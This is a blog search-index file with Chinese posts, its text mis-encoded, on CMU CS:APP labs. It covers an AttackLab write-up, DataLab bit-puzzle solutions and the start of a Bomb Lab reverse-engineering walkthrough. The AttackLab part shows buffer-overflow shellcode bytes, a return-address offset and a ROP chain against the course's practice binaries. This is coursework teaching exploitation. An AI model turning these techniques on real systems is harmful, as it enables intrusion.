<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AttackLab</title>
      <link href="2021/07/18/AttackLab/"/>
      <url>2021/07/18/AttackLab/</url>
      
        <content type="html"><![CDATA[<h1 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h1><h2 id="touch1"><a href="#touch1" class="headerlink" title="touch1"></a>touch1</h2><p><img src="https://i.loli.net/2021/07/18/eP4hAwgymJpYRLi.png" alt=""></p><p>ç»“åˆæ±‡ç¼–ä»£ç å¯ä»¥ç¡®å®šè¿”å›åœ°å€è·ç¦»æˆ‘ä»¬è¾“å…¥çš„bufè·ç¦»ä¸º0x28ï¼ŒæŸ¥çœ‹Getså‡½æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__fastcall <span class="title">Gets</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  gets_cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = dest; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = _IO_getc(infile);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> || v2 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *i = v2;</span><br><span class="line">    save_char(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  *i = <span class="number">0</span>;</span><br><span class="line">  save_term();</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥è¾“å…¥ä»»æ„æ•°é‡çš„å­—ç¬¦</p><p>é‚£å°±å¥½åŠäº†ï¼Œæˆ‘ä»¬ä½¿ç”¨é™„ä»¶é‡Œçš„hex2rawæ–‡ä»¶æ„é€ è¾“å…¥ï¼Œå†ç”¨ç®¡é“ç¬¦è¾“å…¥åˆ°æ–‡ä»¶ä¸­å³å¯</p><p>payloadå’Œattackæ•ˆæœå¦‚ä¸‹:</p><p><img src="https://i.loli.net/2021/07/18/8xLTPegmUZyAs3i.png" alt=""></p><h2 id="touch2"><a href="#touch2" class="headerlink" title="touch2"></a>touch2</h2><p>ä¸çœ‹IDAåæ±‡ç¼–å‡ºæ¥çš„ä¼ªä»£ç äº†ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ¬ºè´Ÿäºº2333ï¼Œç›´æ¥objdumpå¥½äº†</p><p>ä»ç½‘ä¸Šæ•´äº†ä¸ªnmé…åˆobjdumpæ¥åæ±‡ç¼–æŒ‡å®šå‡½æ•°çš„jioæœ¬</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">vmlinux=<span class="variable">$1</span> </span><br><span class="line">symbol=<span class="variable">$2</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$vmlinux</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;usage : <span class="variable">$0</span> vmlinux symbol&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> </span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"> </span><br><span class="line">startaddress=$(nm -n <span class="variable">$vmlinux</span> | grep <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">endaddress=$(nm -n <span class="variable">$vmlinux</span> | grep -A1 <span class="string">&quot;\w\s<span class="variable">$symbol</span>&quot;</span> | awk <span class="string">&#x27;&#123;getline; print &quot;0x&quot;$1;exit&#125;&#x27;</span>) </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$symbol</span>&quot;</span> ]; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;dump all symbol&quot;</span></span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;start-address: <span class="variable">$startaddress</span>, end-address: <span class="variable">$endaddress</span>&quot;</span> </span><br><span class="line">    objdump -d <span class="variable">$vmlinux</span> --start-address=<span class="variable">$startaddress</span> --stop-address=<span class="variable">$endaddress</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥è¿›touch2å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start-address: 0x00000000004017ec, end-address: 0x000000000040184c</span><br><span class="line"></span><br><span class="line">ctarget:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017f0:89 fa                mov    %edi,%edx</span><br><span class="line">  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:00 00 00 </span><br><span class="line">  4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:75 20                jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:be e8 30 40 00       mov    $0x4030e8,%esi</span><br><span class="line">  401809:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40180e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:be 10 31 40 00       mov    $0x403110,%esi</span><br><span class="line">  401829:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40182e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40183d:e8 0d 05 00 00       callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸¤ä¸ªprintfçš„å‚æ•°ï¼Œåˆ†åˆ«è¾“å‡ºå¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/07/18/iLu5wCNo9Dnk4fZ.png" alt=""></p><p>é‚£ä¹ˆå³æˆ‘ä»¬å¾—è®©ä¼ å…¥çš„å‚æ•°å’Œcookieç›¸ç­‰ï¼Œå†è·³è½¬åˆ°touch2</p><p><img src="https://i.loli.net/2021/07/18/7yZxrT24QwUn8K9.png" alt=""></p><p>ç»è¿‡è°ƒè¯•å‘ç°æˆ‘ä»¬rspçš„åœ°å€æ˜¯mmapå‡ºæ¥çš„ä¸€å—å…·æœ‰RWXæƒé™çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸‹å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥èƒ½å¤Ÿæ‰§è¡Œä»£ç äº†å±äºæ˜¯ï¼Œé‚£ğŸ‘´ğŸ»ç›´æ¥å†™æ±‡ç¼–è¿›å»ï¼Œå†åšä¸€æ¬¡ret</p><p>ä½¿ç”¨pwntoolsçš„å‘½ä»¤è¡Œå·¥å…·æ¥ç”Ÿæˆæ±‡ç¼–ä»£ç çš„äºŒè¿›åˆ¶å½¢å¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x59b997fa; ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7fa97b959c3</span><br></pre></td></tr></table></figure><p>éªŒè¯ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn disasm 48c7c7fa97b959c3 -c amd64</span><br><span class="line">   0:    48 c7 c7 fa 97 b9 59     mov    rdi,  0x59b997fa</span><br><span class="line">   7:    c3                       ret</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/63tK5rOUPTQs9uC.png" alt=""></p><p>è¿™ã€‚ã€‚ã€‚åº”è¯¥æ˜¯æˆåŠŸäº†å§ï¼Œæ¯•ç«Ÿæ²¡æœ‰Misfileï¼Œä¸çŸ¥é“ä¸‹é¢çš„FAILå•¥æ„æ€</p><h2 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h2><p>idaåç¼–è¯‘å‡ºæ¥çš„hexmatchå‡½æ•°æ˜¯ä»€ä¹ˆç©æ„ï¼Œçœ‹çš„ä¸€å¤´é›¾æ°´ï¼Œå‚è€ƒäº†ä¸€ä¸‹wpï¼Œå‘ç°ä¸åŒå¤§ä½¬çš„wpä¸­éƒ½ç›´æ¥æœ‰æºç ï¼ˆä»å“ªæçš„ã€‚ã€‚ï¼‰</p><p><img src="https://i.loli.net/2021/07/18/btuhGr1vaXEzqsQ.png" alt=""></p><p>é‚£å°±æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒå‘—ï¼Œä¼ ä¸ªåœ°å€è¿›å…¥ï¼Œè¿™ä¸ªåœ°å€éœ€è¦æŒ‡å‘cookie</p><p>å°±å¤šç»•äº†ä¸ªå¼¯ï¼Œå’Œtouch2å·®ä¸å¤š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x5561dcb0;push 0x4018fa;ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7b0dc615568fa184000c3</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/HczPui42NJO63jB.png" alt=""></p><h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>ropç³»åˆ—æ ˆæ— æ³•æ‰§è¡Œï¼Œé‚£ä¹ˆå°±ç”¨æˆ‘ä»¬ç†Ÿæ‚‰çš„ropæ¥æ</p><p>é¦–å…ˆæ˜¯touch2ï¼ˆtouch1è·Ÿä¹‹å‰é‚£ä¸ªæ²¡å•¥ä¸ä¸€æ ·çš„ï¼‰</p><p>ç›´æ¥ROPgadgetä¸€æŠŠæ¢­</p><p><img src="https://i.loli.net/2021/07/18/LHjT5YSAfP6hsla.png" alt=""></p><p>payloadå°±æ˜¯<code>pop_rdi_ret + cookie + touch2_address</code></p><p><img src="https://i.loli.net/2021/07/18/9djsK5fhUkGD8JS.png" alt=""></p><h2 id="rop3"><a href="#rop3" class="headerlink" title="rop3"></a>rop3</h2><p>å¡ä½äº†ï¼Œç®—åç§»çš„æ—¶å€™ç®—é”™äº†QAQï¼Œå¤§ä½“æ€è·¯é‡‡ç”¨ä¸€ä¸ªå¤§ä½¬çš„å›¾ç‰‡</p><p><img src="https://i.loli.net/2021/07/18/RlG8pJHzBh1N72C.png" alt=""></p><p>å…¶ä¸­add_xyæ˜¯farmé‡Œè‡ªå¸¦çš„å‡½æ•°ï¼Œåœ¨rtargetä¸­å«æœ‰</p><p><img src="https://i.loli.net/2021/07/18/hHrwgfzcTMeoy6O.png" alt=""></p><h1 id="æ€»ç»“åé¦ˆ"><a href="#æ€»ç»“åé¦ˆ" class="headerlink" title="æ€»ç»“åé¦ˆ"></a>æ€»ç»“åé¦ˆ</h1><ol><li>gdbè°ƒè¯•å¸¦å‚æ•°æ–‡ä»¶ï¼Œset args -qï¼Œå…¶ä¸­â€-qâ€ä¸ºå‚æ•°</li><li>objdump é…åˆ nm åæ±‡ç¼–å‡ºæŸä¸ªæŒ‡å®šå‡½æ•°</li><li>pwn asm å‘½ä»¤è¡Œå·¥å…·ç”ŸæˆäºŒè¿›åˆ¶æ±‡ç¼–æ•°æ®ï¼Œå…¶ä¸­-cæŒ‡å®šå½¢å¼ï¼Œé»˜è®¤linux/i386</li><li>äºŒè¿›åˆ¶æ•°æ®å¯ä»¥ç”¨ç®¡é“ç¬¦æ¥è¾“å…¥åˆ°æ–‡ä»¶</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DataLab</title>
      <link href="2021/07/10/DataLab/"/>
      <url>2021/07/10/DataLab/</url>
      
        <content type="html"><![CDATA[<h1 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><p>æ€è·¯æ¯”è¾ƒç®€å•ï¼Œå³ä½¿ç”¨~å’Œ&amp;å®ç°å¼‚æˆ–<br>å¼‚æˆ–å³ç›¸åŒä¸º0ä¸åŒä¸º1<br>Y = ~AB + ~BAå³å¯å®ç°<br>ç„¶åæŠŠæˆ–é€šè¿‡å¾·æ‘©æ ¹å¾‹å˜æˆä¸å³å¯å®ç°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; ~(x &amp; ~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>è¡¥ç çš„æœ€å°äºŒè¿›åˆ¶æ•°å°±æ˜¯æœ€é«˜ä½1å…¶ä½™ä¸º0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><p>å› ä¸ºè¿”å›å€¼åªæœ‰0å’Œ1ï¼Œæ‰€ä»¥è€ƒè™‘æœ€åè‚¯å®šæ˜¯ä½¿ç”¨!è¿ç®—ç¬¦æ¥å®ç°<br>ç„¶åè€ƒè™‘æœ€å¤§æ•°ç‹¬æœ‰çš„ç‰¹ç‚¹ï¼Œå³0x7fffffff + 1 = 0x80000000 = -2147483648<br>æ‰€ä»¥ 0x80000000 + 0x7fffffff = -1<br>æ‰€ä»¥ 0x80000000 + 0x7fffffff + 1 = -1 + 1 = 0<br>æ‰€ä»¥ !(0x80000000 + 0x7fffffff + 1) = !(-1 + 1) = 1<br>ç»¼ä¸Šå³ !((x + 1) + x + 1)<br>è¿™ä¸ªå¼å­çœ‹ç€å°±å¾ˆè¯¡å¼‚ï¼Œåªæœ‰è¾¹ç•Œå€¼æ‰æ»¡è¶³ï¼Œä½†æ˜¯å°‘è€ƒè™‘äº†æœ€å°è¾¹ç•Œå€¼0å’Œ-1çš„æƒ…å†µï¼ˆå‡ºé”™åæ‰æ„è¯†åˆ°ï¼‰ï¼Œæ‰€ä»¥åŠ ä¸ªå’Œ0x7fffffffç›¸ä¸çš„æ“ä½œå³å¯é¿å…0xffffffffçš„æƒ…å†µ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(((x + <span class="number">1</span>) + (x &amp; <span class="number">0x7fffffff</span>)) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><p>å¥‡æ•°ä½å…¨ä¸º1æ‰èƒ½æ˜¯1ï¼Œé‚£ä¹ˆ0x0 - 0xF ä¸­ï¼Œåªæœ‰0xA, 0xB, 0xE, 0xFæ‰æ»¡è¶³ï¼Œå³è¿™ä¸ªæ•°å­—æœ€å°çš„æ˜¯0xAAAAAAAAï¼Œé‚£ä¹ˆæ— è®ºè¿™ä¸ªæ•°æ˜¯å¤šå°‘ï¼Œåªè¦æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œå…¶ä¸0xAAAAAAAAç›¸ä¸åï¼Œå¶æ•°ä½ä¸€å®šä¸º0ï¼ˆAH = 1010Bï¼‰ï¼Œæ‰€ä»¥å¦‚æœè®¾è¿™ä¸ªæ•°æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¸0xAAAAAAAAä¸è¿ç®—åï¼Œå…¶å€¼ä¸€å®šæ˜¯0xAAAAAAAAï¼Œé‚£ä¹ˆå†ä¸0xAAAAAAAAå¼‚æˆ–åï¼Œå…¶å€¼ä¸€å®šä¸º0ï¼Œå–ååˆ™ä¸º1ï¼›åä¹‹ï¼Œä¸æ»¡è¶³è¦æ±‚ï¼Œå…¶å€¼ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// a b e f</span></span><br><span class="line">  <span class="keyword">return</span> !((x &amp; <span class="number">0xAAAAAAAA</span>) ^ <span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>æ— è®ºä»äºŒè¿›åˆ¶æ•°ä¸Šæ¨è¿˜æ˜¯å‡­æ„Ÿè§‰ç¡¬è¯•ï¼Œéƒ½æŒºç®€å•çš„ï¼Œä»¥8ä½æ¥ä¸¾ä¸ªä¾‹å­</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5:  00000101</span><br><span class="line">-5: 11111011</span><br></pre></td></tr></table></figure><p>æ— è®ºæ­£æ•°è¿˜æ˜¯è´Ÿæ•°éƒ½ç­‰äºåŸæ¥çš„å–å + 1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><p>æ€è·¯å¤§ä½“ä¸Šåˆ†ä¸ºä¸¤éƒ¨åˆ†<br>ç¬¬ä¸€ä¸ªæ˜¯å‰28ä½ï¼Œå¿…é¡»æ˜¯0x3ï¼Œå¼‚æˆ–åˆ¤æ–­å³å¯<br>ç¬¬äºŒä¸ªæ˜¯å4ä½ï¼Œé€»è¾‘å¦‚ä¸‹ï¼ˆæˆ–çš„æ€ç»´ï¼‰ï¼š<br>è¦ä¹ˆæœ€é«˜ä½æ˜¯0ï¼ˆèŒƒå›´é”å®šåœ¨0x0 - 0x7ï¼‰<br>è¦ä¹ˆç¬¬äºŒä¸‰ä½æ˜¯0ï¼ˆèŒƒå›´é”å®šåœ¨0x8 - 0x9ï¼‰<br>ç„¶åç”¨!è¿ç®—çš„æ€ç»´ç›¸ä¸å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>)) &amp; (!((x &lt;&lt; <span class="number">28</span>) &gt;&gt; <span class="number">31</span>) | !((x &lt;&lt; <span class="number">29</span>) &gt;&gt; <span class="number">30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><p>å®ç°ä¸€ä¸ªx ? y : z æ¡ä»¶è¿ç®—ç¬¦</p><p>é€»è¾‘æ˜¯ï¼Œå¦‚æœxä¸ä¸º0åˆ™è¿”å›yï¼Œå¦åˆ™z</p><p>é‚£ä¹ˆå¯ä»¥ç”¨å¼‚æˆ–æ¥åšï¼Œæ€è·¯åˆæ­¥æ˜¯è¿™æ ·çš„ï¼Œå› ä¸ºxæ˜¯ä¸ç¡®å®šçš„æ•°ï¼Œä½†æ˜¯åœ¨é€»è¾‘ä¸­åªæœ‰0å’Œé0ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä¸¤æ¬¡!!æ“ä½œç¬¦è®©ä»–å˜æˆé0å’Œ0çš„ä¸¤ä¸ªä»…æœ‰çš„æƒ…å†µ(0x00000000å’Œ0x00000001)</p><p>ä½¿ç”¨<code>~x + 1</code>å¯ä»¥è®©ä¸¤ç§æƒ…å†µåˆ†åˆ«ä¸º0x00000000å’Œ0xffffffffï¼Œç„¶åå†ç”¨å¼‚æˆ–å¤„ç†å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((~(!!x) + <span class="number">1</span>) &amp; y) ^ ((~(!x) + <span class="number">1</span>) &amp; z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æœªå®Œå¾…ç»­"><a href="#æœªå®Œå¾…ç»­" class="headerlink" title="æœªå®Œå¾…ç»­"></a>æœªå®Œå¾…ç»­</h2><h1 id="åé¦ˆæ€»ç»“"><a href="#åé¦ˆæ€»ç»“" class="headerlink" title="åé¦ˆæ€»ç»“"></a>åé¦ˆæ€»ç»“</h1><ol><li>åˆ¤æ–­åœ¨æŸä¸ªåŒºé—´æ“…ç”¨å¼‚æˆ–æ“ä½œ</li><li>ä»¥äºŒè¿›åˆ¶çš„è§’åº¦çœ‹å¾…é—®é¢˜</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bomb Lab</title>
      <link href="2021/06/15/BombLab/"/>
      <url>2021/06/15/BombLab/</url>
      
        <content type="html"><![CDATA[<p>å®éªŒè¯´æ˜ï¼š</p><blockquote><p>A â€œbinary bombâ€ is a program provided to students as an object code file. When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb â€œexplodes,â€ printing an error message and logging the event on a grading server. Students must â€œdefuseâ€ their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger. Itâ€™s also great fun. A legendary lab among the CMU undergrads.</p></blockquote><p>æ˜¯ä¸ªé€†å‘çš„å°æ¸¸æˆï¼Œæˆ‘ä»¬ä½¿ç”¨gdbæ¥åš</p><p>åæ±‡ç¼–ä¸€ä¸‹mainå‡½æ•°ï¼Œå¯ä»¥å¤§æ¦‚çœ‹åˆ°æœ‰å¾ˆå¤šçš„phaseï¼Œæˆ‘ä»¬éœ€è¦é€ä¸ªæ‹†é™¤<br><img src="https://i.loli.net/2021/06/15/QzuaNr1OUdfVMqw.png" alt=""></p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p><img src="https://i.loli.net/2021/06/15/aiNtKRXkTMzxuAY.png" alt=""><br>åæ±‡ç¼–å¯ä»¥çœ‹åˆ°åœ¨phase_1é‡Œé¢è°ƒç”¨äº†ä¸€ä¸ªstrings_not_equalçš„å‡½æ•°ï¼ŒçŒœæµ‹å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ç›¸ç­‰å°±ä¼šçˆ†ç‚¸ï¼Œx64ä¸‹ç¨‹åºé€šè¿‡rsiä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å…·ä½“çš„å†…å­˜å€¼å³å¯ã€‚<br><img src="https://i.loli.net/2021/06/15/oKE52W9rqa6IjAR.png" alt=""></p><p>è¿è¡Œç¨‹åºï¼Œå‘ç°å¯ä»¥ä¸è¢«å¼•çˆ†</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>åæ±‡ç¼–phase_2<br><img src="https://i.loli.net/2021/06/15/5UmbPSIHk1XFpd9.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°åé¢æœ‰ä¸ªjneæŒ‡ä»¤å‘ä¸Šè·³è½¬ï¼Œæ‰€ä»¥è‚¯å®šæ˜¯ä¸ªå¾ªç¯ç»“æ„ï¼Œåœ¨ä¸Šé¢æ˜¯ä¸ªread_six_numbersï¼Œè¯»å…¥6ä¸ªæ•°å­—ï¼Œæ‰€ä»¥çŒœæµ‹å¯¹æ¯ä¸ªæ•°å­—éƒ½æœ‰è¦æ±‚ï¼Œå¹¶ä¸”é€šè¿‡åŠ¨è°ƒå¯ä»¥å‘ç°cmpé‚£æ¡æŒ‡ä»¤è¦æ±‚ç¬¬ä¸€ä¸ªæ•°å­—ä¸º1</p><p><img src="https://i.loli.net/2021/06/15/BHQwntopNq5by4S.png" alt=""><br>è¯»å…¥å…­ä¸ªæ•°å­—ï¼Œå¦åˆ™å°±é€€å‡ºç¨‹åº</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span 